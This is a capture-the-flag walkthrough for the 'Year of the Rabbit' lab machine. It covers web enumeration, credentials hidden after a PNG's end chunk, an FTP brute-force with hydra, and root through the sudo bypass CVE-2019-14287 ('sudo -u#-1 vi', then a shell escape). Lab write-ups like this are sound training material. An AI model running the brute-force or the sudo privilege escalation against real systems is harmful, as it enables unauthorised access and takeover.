# Year of the Rabbit

1. `nmap` reveals FTP, SSH and HTTP services on standard ports.

2. `gobuster` (with `SecLists/Discovery/Web-Content/common.txt`) on the web server reveals an interesting `/assets` directory. It contains a file `style.css` which contains a comment suggesting to check the page `/**REDACTED**.php`.

3. When checking this page, a JS alert tells us to turn off JS, we get redirected to youtube and rickrolled. Turning off JS leads to a different dead end where we still get rickrolled...

Sniffing the sequence of web requests with BurpSuite, we capture an intermediary redirection:
```
GET /intermediary.php?hidden_directory=**REDACTED** HTTP/1.1
```
seemingly revealing a possible hidden directory.

4. This directory indeed exists and contains a PNG image `Hot_Babe.png` of a [famous picture](https://en.wikipedia.org/wiki/Lenna).

```
$ exiftool Hot_Babe.png 
ExifTool Version Number         : 12.05
File Name                       : Hot_Babe.png
...
Warning                         : [minor] Trailer data after PNG IEND chunk
...
$ hd Hot_Babe.png | tail -81
00073ad0  4b ff 3f 61 68 c9 42 a5  46 15 38 00 00 00 00 49  |K.?ah.B.F.8....I|
00073ae0  45 4e 44 ae 42 60 82 4f  74 39 52 72 47 37 68 32  |END.B`.Ot9RrG7h2|
00073af0  7e 32 34 3f 0a 45 68 2c  20 79 6f 75 27 76 65 20  |~24?.Eh, you've |
00073b00  65 61 72 6e 65 64 20 74  68 69 73 2e 20 55 73 65  |earned this. Use|
00073b10  72 6e 61 6d 65 20 66 6f  72 20 46 54 50 20 69 73  |rname for FTP is|
00073b20  20 66 74 70 75 73 65 72  0a 4f 6e 65 20 6f 66 20  | ftpuser.One of |
00073b30  74 68 65 73 65 20 69 73  20 74 68 65 20 70 61 73  |these is the pas|
00073b40  73 77 6f 72 64 3a 0a 4d  6f 75 2b 35 36 6e 25 51  |sword:.Mou+56n%Q|
00073b50  4b 38 73 72 0a 31 36 31  38 42 30 41 55 73 68 77  |K8sr.1618B0AUshw|
...
$ strings Hot_Babe.png | cat -n
...
  6278  IEND
  6279  Ot9RrG7h2~24?
  6280  Eh, you've earned this. Username for FTP is ftpuser
  6281  One of these is the password:
  6282  Mou+56n%QK8sr
  6283  1618B0AUshw1M
...
$ strings Hot_Babe.png | tail -n+6282 > passlist
```
This gives us a login (`ftpuser`) and a list of possible passwords for the FTP.

5. We brute-force the FTP access with `hydra`.

```
$ hydra -l ftpuser -P passlist $TARGET_IP ftp 
...
[21][ftp] host: 10.10.**.***   login: ftpuser   password: **REDACTED**
1 of 1 target successfully completed, 1 valid password found
```

6. We access the FTP and find a file `Eli's_Creds.txt` containing a Brainfuck program.

```
$ bf Eli\'s_Creds.txt
User: eli
Password: **REDACTED**
```

7. We log in as `eli` through SSH. It is not a sudoer.

```
$ ssh eli@$TARGET_IP
...
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
...
eli@year-of-the-rabbit:~$ find / -name '*s3cr3t*' 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t/
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -a
.  ..  .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just **REDACTED**
Honestly!

Yours sincerely
   -Root
```

8. We log in as `gwendoline` and get the **user flag** in the home directory.

```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ sudo --version
Sudo version 1.8.10p3
...
```

9. We can launch `vi` as any user but `root`, which can be exploited in `sudo` versions < 1.8.28 ([CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)) using the `#-1` user ID.

```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 vi /home/gwendoline/user.txt 
```

Inside `vi`, type `:!/bin/bash` to launch a shell as `root` and reach the **root flag**.

```
root@year-of-the-rabbit:/home/gwendoline# cat /root/root.txt 
**REDACTED**
```
